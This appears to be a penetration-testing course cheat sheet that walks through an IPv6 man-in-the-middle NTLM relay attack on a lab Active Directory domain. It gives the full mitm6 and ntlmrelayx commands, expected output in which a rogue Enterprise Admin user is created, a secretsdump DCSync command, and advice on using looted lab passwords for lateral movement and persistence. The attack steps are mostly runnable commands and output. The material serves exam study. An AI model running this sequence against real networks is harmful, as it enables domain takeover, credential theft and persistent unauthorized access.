---

# 🔐 **IPv6 Attack Relay Cheat Sheet**

---

# 📋 **Summary**

This attack exploits **IPv6** within a network using `mitm6` to spoof a DNS server and trick the "Punisher" machine into thinking the attacker’s machine is a legitimate network resource during its network discovery phase. The "Punisher" machine then sends its **NTLM authentication** to the spoofed resource (`fakewpad.marvel.local`).

**`ntlmrelayx.py`** captures these credentials and **relays** them to the **real domain controller** (`192.168.164.138`) to authenticate and execute actions, such as creating a new user with elevated privileges. The **goal** is to compromise the **domain controller** using the relayed credentials, not a fake one.

All captured information and actions performed on the domain controller are stored in the specified **lootme** folder for further analysis and exploitation. This can include using tools like **DCSync** to extract domain secrets.

📝 **Step-by-Step**:

- **Capture**: The "Punisher" sends **NTLM credentials** during its network discovery phase, which are intercepted by `mitm6` and `ntlmrelayx.py`.
- **Relay**: `ntlmrelayx.py` relays these credentials to the **domain controller** (`ldaps://192.168.164.138`).
- **Domain Response**: If the domain controller accepts the credentials, it allows actions like creating new users or retrieving sensitive data.
- **Storing Data**: All captured information is saved in the **lootme** folder for later use.

💡 **Key Points**:

- "Fakewpad" is used to **capture credentials**, but the ultimate target is the **real domain controller**.
- The **lootme** folder is the storage location for all data obtained during the attack, including credentials, user information, and domain secrets.

---

---

### 🛠️ **Detailed Notes**:

### **1. Setup NTLM Relay**:

- **Command**:
    
    ```bash
    ntlmrelayx.py -6 -t ldaps://192.168.164.138 -wh fakewpad.marvel.local -l lootme
    
    ```
    
    - **Explanation**:
        - Sets up NTLM relay targeting the **LDAPS** server.
        - The `wh` flag spoofs the Web Proxy Auto-Discovery (WPAD).
    
    💡 **Tip**: Always check your **target IP address** and ensure it's correct for the domain controller.
    

---

### **2. Start MITM Attack (Separate Tab)**:

- **Command**:
    
    ```bash
    sudo mitm6 -d marvel.local
    
    ```
    
    - **Explanation**:
        - Initiates the **Man-In-The-Middle (MITM)** attack by spoofing DNS for the `marvel.local` domain.
        - Redirects victim’s traffic to your machine.
    
    💡 **Tip**: Run this in a separate terminal tab to avoid conflicts with `ntlmrelayx`.
    

🚨 **Critical Mention**: Be aware that **IPv6 must be enabled** on the network for this to work. Many networks have IPv6 turned on by default, even if they primarily use IPv4.

---

### **3. Monitor Traffic and Capture Credentials**:

- **Expected Output** (from `ntlmrelayx`):
    
    ```
    [*] Authenticating against ldaps://192.168.164.138 as MARVEL\\THEPUNISHER$ SUCCEED
    [*] Attempting to create user in: CN=Users,DC=MARVEL,DC=local
    [*] Adding new user with username: AcTeunrGXt and password: MZk}:cjr-Apd@UJ result: OK
    
    ```
    
    - **Explanation**:
        - The relay captures credentials from a logged-in domain user (e.g., `THEPUNISHER`).
        - Successfully creates a new domain user with admin privileges.

🚨 **Critical Mention**: **Authentication Success** here is crucial. If you don’t see the success message, recheck your setup.

---

### **4. Verify New Domain User**:

- **Navigate**:
    - `Server Manager -> Active Directory Users and Computers -> MARVEL.local -> Users`
    - **Look for user**: `AcTeunrGXt`
    
    💡 **Tip**: The user will have **Enterprise Admin** privileges but may not show up as a **Domain Admin**.
    

---

### **5. Run DCSync to Dump Domain Secrets**:

- **Command**:
    
    ```bash
    secretsdump.py marvel/AcTeunrGXt:MZk}:cjr-Apd@UJ@192.168.164.138
    
    ```
    
    - **Explanation**:
        - Uses the newly created user to run **DCSync**, which dumps sensitive credentials from the domain controller.

🚨 **Critical Mention**: Ensure you use the **correct username and password** generated earlier.

---

### 📖 **Abbreviations & Definitions**:

- **NTLM Relay**: A technique where captured NTLM authentication requests are relayed to another machine, allowing unauthorized access.
- **mitm6**: A tool for conducting IPv6 **Man-In-The-Middle (MITM)** attacks by spoofing DNS responses.
- **LDAPS**: **LDAP** (Lightweight Directory Access Protocol) over SSL/TLS, used for secure directory services communication.
- **DCSync**: An attack that allows a compromised user to simulate domain controller behavior and extract sensitive data, like password hashes.
- **SUID**: Set User ID, which allows a program to run with the permissions of its owner.
- **WPAD**: **Web Proxy Auto-Discovery Protocol**, used by browsers to locate proxy configuration files automatically.

---

### 🚨 **Critical Mentions & Exam Traps**:

- **⚠️ IPv6 must be enabled**: Ensure that **IPv6 is enabled** on the network. Without it, the attack won't work.
- **📝 Use separate tabs**: Always run `ntlmrelayx` and `mitm6` in separate tabs to avoid command conflicts.
- **💡 Use `DCSync` after user creation**: You don’t need to be a Domain Admin—**Enterprise Admin** is enough to run `DCSync` and dump credentials.

---

### 📌 **Potential Pitfalls**:

1. **Target Misconfiguration**:
    - Ensure you’re targeting the correct **LDAPS** server. If `ldaps://192.168.164.138` is incorrect, the relay will fail.
2. **Output Confusion**:
    - If the output does not show **authentication success**, it’s important to check your IP settings, domain configuration, and ensure that traffic is correctly routed through the MITM setup.
3. **Failure to Spoof DNS**:
    - Ensure that **mitm6** successfully spoofs DNS replies. Incorrect spoofing can break the relay attack.

---

### 💡 **Quick Tips for the Exam**:

- **Check for `Success!` in ntlmrelayx**: If you don’t see this, the attack has failed.
- **Look for Enterprise Admin Privileges**: Remember, even if the new user isn’t a Domain Admin, **Enterprise Admin** is enough to compromise the domain.
- **Make sure `mitm6` is running in a separate tab**: Running it in the same tab as `ntlmrelayx` will cause conflicts, making the attack fail.

---

---

### 📂 **Loot Information: domain_users_by_group.html**

- **Location**: `lootme/domain_users_by_group.html`
- **Importance**: This file contains key information about **domain users and groups**, including:
    - **Administrators** and **Enterprise Admins**
    - Account details like **name**, **SAM name**, **creation date**, and **passwords**

### **Notable Entries**:

- **SQL Service**:
    - **SAM Name**: `SQLService`
    - **Password**: `MYpassword123#`
    - **Flags**: `DONT_EXPIRE_PASSWD`, `NORMAL_ACCOUNT`
    - **Groups**: Domain Admins, Enterprise Admins, Schema Admins
- **Tony Stark**:
    - **SAM Name**: `tstark`
    - **Groups**: Domain Admins, Enterprise Admins
- **Administrator**:
    - **SAM Name**: `Administrator`
    - **Password**: Not listed, but key for domain administration.

---

💡 **Usage**:

- Use the **passwords and privileges** found in this file to further escalate access or perform post-exploitation activities, such as using the SQL Service account (`SQLService` with password `MYpassword123#`) to access sensitive areas of the network.

🚨 **Critical Mention**: This file is crucial for identifying which users have **admin-level** access, and any associated passwords can help in maintaining persistent access or moving laterally within the network.

---